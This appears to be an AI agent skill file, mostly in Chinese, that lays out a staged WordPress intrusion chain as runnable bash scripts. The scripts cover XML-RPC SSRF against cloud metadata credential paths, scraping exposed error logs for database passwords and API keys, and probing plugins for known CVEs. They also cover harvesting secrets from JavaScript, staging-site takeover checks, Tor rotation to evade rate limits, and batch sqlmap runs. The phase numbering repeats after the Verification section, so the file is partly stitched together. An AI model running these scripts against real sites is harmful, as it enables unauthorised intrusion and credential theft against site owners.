---
name: deep-invade
description: "WordPress 深度渗透：SSRF、插件 CVE、JS 挖掘、端口扫描链。"
version: 1.1.1
revision_date: 2026-11-13
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, httpx, nuclei
metadata:
  tags: [recon, pentest, deep, SSRF, CVE, wordpress]
  category: recon
  related_skills:
    - wp-mass-recon
    - error-log-mining
    - js-secrets-extraction
    - staging-subdomain-hunt
    - wordpress-plugin-hunt
    - port-service-discovery
    - cors-credential-wordpress
    - source-leak-hunt
    - phpinfo-to-rce
---

# 深度入侵技能

针对由 `wp-mass-recon` 排定优先级的 WordPress 目标，提供聚焦的后续跟进方法论。它把
XML-RPC SSRF 验证、暴露日志分析、插件版本审查、JavaScript 检查、预发布环境发现、
服务测绘与 API 枚举串联起来。

## When to Use

- `wp-mass-recon` 对某目标给出 >= 6 的评分（CORS 已确认、XMLRPC 开放、发现源码泄漏）。
- 你被分配了一个单一高价值目标进行深度评估。
- 在表层侦察之后，你需要找到通向 RCE 或数据泄露的利用链。
- 多个相互独立的信号足以支持一次更深入、针对具体目标的后续跟进。

## Prerequisites

- `curl`、`python3`，以及每个所选阶段所需的工具。
- 目标已由 wp-mass-recon 给出 >= 6 的评分（已确认 WordPress，且至少具备以下两项中的：CORS/XMLRPC/源码泄漏）。
- 用于 SSRF/盲打确认的协作端（Burp Collaborator、interactsh 或你自己的服务器）。
- 当端口扫描在范围内时，需有可用的 `nmap`。

## How to Run

按顺序执行探测。每个阶段都建立在前一阶段之上：

1. 扩展 SSRF 探测（XMLRPC pingback 打向 IMDS、localhost、内网 IP）
2. 错误日志挖掘（抓取并 grep 凭据、路径、SQL）
3. 插件 CVE 矩阵（30+ REST 命名空间、readme.txt 版本）
4. JavaScript 打包文件分析（11 条用于发现密钥的正则模式）
5. 子域/预发布环境枚举（crt.sh、httpx、WP 安装页面）
6. 端口扫描（nmap -F 查找 MySQL、FTP、SSH、内网 API）
7. API 发现（Swagger、GraphQL、WooCommerce、Gravity Forms）

## 快速参考

| 阶段 | 技术 | 工具 | 典型耗时 |
|-------|-----------|------|--------------|
| 1 | 使用受控回调进行 XML-RPC SSRF 验证 | curl + callback service | 2 min |
| 2 | 暴露错误日志分析 | Python regex | 1 min |
| 3 | 插件命名空间与版本审查 | curl + regex | 3 min |
| 4 | JavaScript 打包文件分析 | `js-secrets-extraction` | 2 min |
| 5 | 子域与预发布环境对比 | crt.sh, httpx, curl | 5 min |
| 6 | 范围内的端口与服务发现 | nmap | 取决于范围 |
| 7 | API 描述与路由发现 | curl + regex | 2 min |

## Procedure

### 阶段 1 — 扩展 SSRF 探测

```bash
TARGET="$1"
COLLAB="$2"  # Your Burp Collaborator / interactsh URL

echo "[*] Phase 1: SSRF Probe"

# Test 1: Confirm pingback SSRF to your callback
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>$COLLAB</string></value></param>
<param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" | grep faultCode

echo "[*] Check Collaborator for callback — if received, SSRF confirmed"

# Test 2: AWS IMDSv1 (15 paths)
for path in "" "iam/security-credentials/" "iam/security-credentials/admin" \
  "iam/security-credentials/ec2-admin" "iam/security-credentials/s3-full-access" \
  "user-data/" "placement/availability-zone" "public-keys/0/openssh-key" \
  "network/interfaces/macs/" "security-groups" "ami-id" "hostname" \
  "instance-id" "mac" "profile"; do

  result=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
    -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>http://169.254.169.254/latest/meta-data/$path</string></value></param>
<param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')

  code=$(echo "$result" | grep -o '[0-9]\+')
  [[ "$code" == "0" ]] && echo "[SSRF] IMDS reachable: /$path" || echo "[--]   IMDS blocked: /$path (faultCode=$code)"
  sleep 0.5
done

# Test 3: Internal network probes
for ip in "127.0.0.1:80" "127.0.0.1:3306" "127.0.0.1:8080" "127.0.0.1:3000" \
  "10.0.0.1:80" "172.16.0.1:80" "192.168.0.1:80" "localhost:22"; do

  result=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
    -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>http://$ip/</string></value></param>
<param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')

  code=$(echo "$result" | grep -o '[0-9]\+')
  [[ "$code" == "0" ]] && echo "[SSRF] Internal reachable: $ip" || true
  sleep 0.5
done
```

### 阶段 2 — 错误日志挖掘

```bash
TARGET="$1"

echo "[*] Phase 2: Error Log Mining"

# Fetch error_log (can be multi-MB)
curl -sk --max-time 30 --connect-timeout 10 "https://$TARGET/error_log" -o /tmp/error_log_$TARGET.txt 2>/dev/null
curl -sk --max-time 30 --connect-timeout 10 "https://$TARGET/wp-content/debug.log" >> /tmp/error_log_$TARGET.txt 2>/dev/null

size=$(wc -c < /tmp/error_log_$TARGET.txt 2>/dev/null)

if [[ "$size" -gt 100 ]]; then
  echo "[+] Error log found: ${size} bytes"

  # Extract server paths
  echo "[*] Server paths:"
  grep -Eo '/[a-zA-Z0-9/_.-]+\.php' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -20

  # Extract email addresses
  echo "[*] Email addresses:"
  grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -10

  # Extract DB credentials
  echo "[*] DB credentials:"
  grep -iE 'mysql_connect|mysqli_connect|new PDO|DB_HOST|DB_USER|DB_PASSWORD|database.*password' /tmp/error_log_$TARGET.txt 2>/dev/null | head -5

  # Extract SQL queries
  echo "[*] SQL queries:"
  grep -iE 'SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|JOIN' /tmp/error_log_$TARGET.txt 2>/dev/null | head -10

  # Extract API keys
  echo "[*] API keys:"
  grep -iE 'api_key|api_secret|access_token|auth_token|bearer' /tmp/error_log_$TARGET.txt 2>/dev/null | head -5

  # PHP error summary
  echo "[*] Error summary:"
  echo "  Fatal: $(grep -ci 'Fatal error' /tmp/error_log_$TARGET.txt)"
  echo "  Warning: $(grep -ci 'Warning' /tmp/error_log_$TARGET.txt)"
  echo "  Notice: $(grep -ci 'Notice' /tmp/error_log_$TARGET.txt)"
  echo "  Deprecated: $(grep -ci 'Deprecated' /tmp/error_log_$TARGET.txt)"

  # Date range
  echo "[*] Date range:"
  head -1 /tmp/error_log_$TARGET.txt | grep -Po '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
  tail -1 /tmp/error_log_$TARGET.txt | grep -Po '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
else
  echo "[-] No error log found"
fi
```

### 阶段 3 — 插件 CVE 矩阵

```bash
TARGET="$1"

echo "[*] Phase 3: Plugin CVE Matrix"

# Probe 30+ plugin REST namespaces
declare -A PLUGINS
PLUGINS[revslider]="/wp-json/revslider/v1/slides|CVE-2024-2534 (RCE)|Slider Revolution"
PLUGINS[elementskit]="/wp-json/elementskit/v1/|CVE-2023-6851/6853 (RCE)|ElementsKit"
PLUGINS[elementor]="/wp-json/elementor/v1/globals|CVE-2024-xxxx (info disclosure)|Elementor"
PLUGINS[gravityforms]="/wp-json/gf/v2/forms|CVE-2024-6115 (auth bypass)|Gravity Forms"
PLUGINS[jetpack]="/wp-json/jetpack/v4/|CVE-2024-1782 (info disclosure)|Jetpack"
PLUGINS[litespeed]="/wp-json/litespeed/v1/|CVE-2024-50550 (privilege escalation)|LiteSpeed Cache"
PLUGINS[woocommerce]="/wp-json/wc/v3/products|API info disclosure|WooCommerce"
PLUGINS[yoast]="/wp-json/yoast/v1/|SEO data disclosure|Yoast SEO"
PLUGINS[acf]="/wp-json/acf/v3/|CVE-2023-xxxx (info disclosure)|Advanced Custom Fields"
PLUGINS[contactform7]="/wp-json/contact-form-7/v1/|Configuration leak|Contact Form 7"
PLUGINS[solidwp]="/wp-json/solidwp-mail/v1/|Mail log disclosure|SolidWP Mail"
PLUGINS[wpsl]="/wp-json/wpsl/v1/|Store locator data|WP Store Locator"
PLUGINS[redirection]="/wp-json/redirection/v1/|Redirect log exposure|Redirection"
PLUGINS[wpml]="/wp-json/wpml/v1/|Translation data|WPML"
PLUGINS[rankmath]="/wp-json/rankmath/v1/|SEO data|Rank Math"

for plugin in "${!PLUGINS[@]}"; do
  IFS='|' read -r path cve name <<< "${PLUGINS[$plugin]}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET$path" 2>/dev/null)
  if [[ "$code" == "200" || "$code" == "401" || "$code" == "403" ]]; then
    echo "[PLUGIN] $name ($plugin) — HTTP $code — $cve"

    # If 200, try to get version from readme.txt
    if [[ "$code" == "200" ]]; then
      ver=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
      [[ -n "$ver" ]] && echo "         Version: $ver"
    fi
  fi
  sleep 0.5
done

# Also probe readme.txt for elementor, revslider (common alternate paths)
for slug in "elementor" "revslider" "js_composer" "wp-rocket" \
  "wordfence" "woocommerce" "jetpack" "litespeed-cache"; do
  ver=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
  [[ -n "$ver" ]] && echo "[VERSION] $slug: $ver"
  sleep 0.3
done
```

### 阶段 4 — JavaScript 密钥提取

完整流程见 `skill_view(name='js-secrets-extraction')`。快速扫描：

```bash
TARGET="$1"

# Fetch homepage and common JS bundles
curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/" -o /tmp/page_$TARGET.html 2>/dev/null
JS_URLS=$(grep -Eo 'src="[^"]+\.js[^"]*"' /tmp/page_$TARGET.html 2>/dev/null | sed 's/src="//;s/"//' | head -10)

for js_url in $JS_URLS; do
  # Make relative URLs absolute
  [[ "$js_url" =~ ^// ]] && js_url="https:$js_url"
  [[ "$js_url" =~ ^/ ]] && js_url="https://$TARGET$js_url"

  content=$(curl -sk --max-time 10 --connect-timeout 10 "$js_url" 2>/dev/null)

  # 11 regex patterns
  echo "$content" | grep -Po '(?:api_key|apiKey|API_KEY)["\s:=]+["'\''][A-Za-z0-9_-]{20,}'
  echo "$content" | grep -Po 'https?://[a-zA-Z0-9.-]+\.(?:amazonaws|cloudfront)\.(?:com|net)[^"'\''\s]*'
  echo "$content" | grep -Eo 'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
  echo "$content" | grep -Eo 'AKIA[0-9A-Z]{16}'
  echo "$content" | grep -Eo '[a-z0-9-]+\.firebaseio\.com'
  echo "$content" | grep -Eo '[a-z0-9-]+\.supabase\.co'
  echo "$content" | grep -Eo 'sk_live_[0-9a-zA-Z]{24,}'
  echo "$content" | grep -Eo 'ghp_[0-9a-zA-Z]{36}'
  echo "$content" | grep -Eo 'xox[bprs]-[0-9a-zA-Z-]+'
  echo "$content" | grep -Po '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}'
  echo "$content" | grep -Eo 'AIza[0-9A-Za-z_-]{35}'
  sleep 0.3
done | sort -u
```

### 阶段 5 — 子域/预发布环境发现

完整流程见 `skill_view(name='staging-subdomain-hunt')`。快速扫描：

```bash
TARGET="$1"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||')

echo "[*] Phase 5: Subdomain/Staging Discovery"

# crt.sh certificate transparency
curl --max-time 30 --connect-timeout 10 -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u > /tmp/subs_$DOMAIN.txt

sub_count=$(wc -l < /tmp/subs_$DOMAIN.txt)
echo "[+] crt.sh: $sub_count subdomains"

# Filter for interesting ones
echo "[*] Interesting subdomains:"
grep -iE 'staging|stage|dev|test|uat|beta|old|new|admin|portal|api|app|dashboard' /tmp/subs_$DOMAIN.txt | head -20

# Probe them for WordPress install pages (staging takeover vector)
echo "[*] Staging takeover check:"
for sub in $(grep -iE 'staging|stage|dev' /tmp/subs_$DOMAIN.txt | head -5); do
  for path in "/wp-admin/install.php" "/wp-admin/upgrade.php" "/wp-admin/setup-config.php"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$sub$path" 2>/dev/null)
    [[ "$code" == "200" ]] && echo "[TAKEOVER] https://$sub$path — HTTP $code"
  done
  sleep 0.5
done
```

### 阶段 6 — 端口扫描

```bash
TARGET="$1"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||')

echo "[*] Phase 6: Port Scan"

nmap -F --open -T4 "$DOMAIN" -oN /tmp/nmap_$DOMAIN.txt 2>/dev/null

echo "[*] Open ports:"
grep 'open' /tmp/nmap_$DOMAIN.txt

# Flag critical exposures
grep -q '3306.*open' /tmp/nmap_$DOMAIN.txt && echo "[CRITICAL] MySQL 3306 open to internet!"
grep -q '27017.*open' /tmp/nmap_$DOMAIN.txt && echo "[CRITICAL] MongoDB 27017 open to internet!"
grep -q '6379.*open' /tmp/nmap_$DOMAIN.txt && echo "[HIGH] Redis 6379 open to internet!"
grep -q '8080.*open\|8081.*open\|8082.*open\|8084.*open' /tmp/nmap_$DOMAIN.txt && echo "[HIGH] Internal API port(s) exposed!"
grep -q '22.*open' /tmp/nmap_$DOMAIN.txt && echo "[INFO] SSH 22 open"
grep -q '21.*open' /tmp/nmap_$DOMAIN.txt && echo "[INFO] FTP 21 open"
```

### 阶段 7 — API 发现

```bash
TARGET="$1"

echo "[*] Phase 7: API Discovery"

# Swagger / OpenAPI
for path in "swagger.json" "swagger.yaml" "openapi.json" "api-docs" "api/docs" \
  "swagger-ui.html" "swagger/index.html" "api/v1/swagger.json" "v2/api-docs" "v3/api-docs"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/$path")
  [[ "$code" == "200" ]] && echo "[API] Swagger: /$path"
  sleep 0.3
done

# GraphQL
for path in "graphql" "api/graphql" "gql" "query" "wp/graphql"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/$path" \
    -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}')
  [[ "$code" == "200" ]] && echo "[API] GraphQL: /$path"
  sleep 0.3
done

# WooCommerce API
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/wc/v3/" | python3 -c "
import sys, json
try:
  data = json.load(sys.stdin)
  if 'namespace' in data:
    print('[API] WooCommerce REST API active')
except: pass" 2>/dev/null

# Gravity Forms API
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/gf/v2/forms" | python3 -c "
import sys, json
try:
  data = json.load(sys.stdin)
  if isinstance(data, list) and len(data) > 0:
    print(f'[API] Gravity Forms: {len(data)} forms')
except: pass" 2>/dev/null
```

## Pitfalls

- **SSRF 的 faultCode 0 并不能证明可达性。** 有些服务器对不可达主机也返回 0。始终先用你自己的协作端回调确认。
- **错误日志可能达到数 GB。** 使用 `curl -r 0-100000` 只抓取前 100KB 做采样。
- **插件命名空间返回 HTTP 200 并不意味着插件存在。** 某些主题/配置会对所有 `/wp-json/` 路径都返回 200。检查响应体中的实际插件数据。
- **nmap 进行 SYN 扫描需要 root。** 如果以非 root 身份在容器内运行，请使用 `-sT`（TCP connect）。

## Verification

- 每次 SSRF 回调都必须出现在你控制的 collaborator/interactsh 服务器上。
- 错误日志必须包含真实的 PHP 错误（而不是一个通用 HTML 页面）。
- 插件 CVE 必须对照 readme.txt 中的实际版本号进行验证（而不仅仅是命名空间存在）。
- 端口扫描结果必须通过 banner 抓取（`nmap -sV`）确认。

### 阶段 6 — Nuclei 漏洞扫描

在全部已发现主机上进行自动化 CVE 与错误配置检测：

```bash
# Scan all alive subdomains for known CVEs
nuclei -l alive_subs.txt \
  -t nuclei-templates/http/ \
  -severity critical,high,medium \
  -H "X-Forwarded-For: 127.0.0.1" \
  -mhe 4 -rl 30 -es info \
  -o nuclei_results.txt

# Target exposure templates specifically
nuclei -l alive_subs.txt \
  -t nuclei-templates/http/exposures/ \
  -o nuclei_exposures.txt

# Network-level scans on discovered IPs
nuclei -l unique_ips.txt \
  -t nuclei-templates/network/ \
  -H "X-Forwarded-For: 127.0.0.1" \
  -mhe 4 -rl 30 -es info

# Scan specific vulnerability classes
for template in cves exposures misconfiguration technologies takeovers; do
  nuclei -l alive_subs.txt \
    -t nuclei-templates/http/$template/ \
    -severity critical,high \
    -o nuclei_${template}.txt
done
```

### 阶段 7 — Tor 代理轮换

将所有扫描流量经 Tor 转发，以绕过激进目标上基于 IP 的速率限制：

```bash
# Start Tor service
sudo systemctl start tor

# Test Tor connectivity
curl --max-time 30 --connect-timeout 10 --socks5 127.0.0.1:9050 https://check.torproject.org/

# nuclei through Tor — rotates IP every request
nuclei -u https://target.com \
  -p socks5://127.0.0.1:9050 \
  -t nuclei-templates/http/

# httpx through Tor
cat alive_subs.txt | httpx -silent -proxy socks5://127.0.0.1:9050

# curl through Tor
curl --max-time 30 --connect-timeout 10 --socks5-hostname 127.0.0.1:9050 https://target.com

# Use proxychains for any command
proxychains4 nmap -sT -Pn target.com
proxychains4 ffuf -u https://target.com/FUZZ -w $WEB_WORDLIST
```

### 阶段 8 — SQL 注入扫描

对枚举过程中发现的带参 URL 进行自动化 SQLi 检测：

```bash
# Extract parameterized URLs for SQLi testing
cat all_urls.txt | grep "=" | sort -u > parameterized_urls.txt

# sqlmap on individual endpoints
sqlmap -u "https://target.com/page.php?id=1" --dbs --banner --batch --random-agent

# From saved Burp request file
sqlmap -r request.txt --dbs --banner --batch

# Batch scanning: test all parameterized URLs
cat parameterized_urls.txt | while read url; do
  sqlmap -u "$url" --batch --random-agent --level 1 --risk 1 \
    --smart --answers="follow=N,skip=Y" 2>/dev/null \
    | grep -q "is vulnerable" && echo "VULNERABLE: $url"
done

# nuclei SQLi templates
nuclei -l parameterized_urls.txt \
  -t nuclei-templates/http/vulnerabilities/sql-injection/ \
  -severity critical,high \
  -o nuclei_sqli.txt

# Time-based blind SQLi detection (non-intrusive)
cat parameterized_urls.txt | while read url; do
  curl -sk --max-time 5 --connect-timeout 5 "$url' AND SLEEP(5)--" \
    -w "%{time_total}s — $url" -o /dev/null
  echo
done | awk '$1 > 4.5 {print "SLOW: " $0}'
```
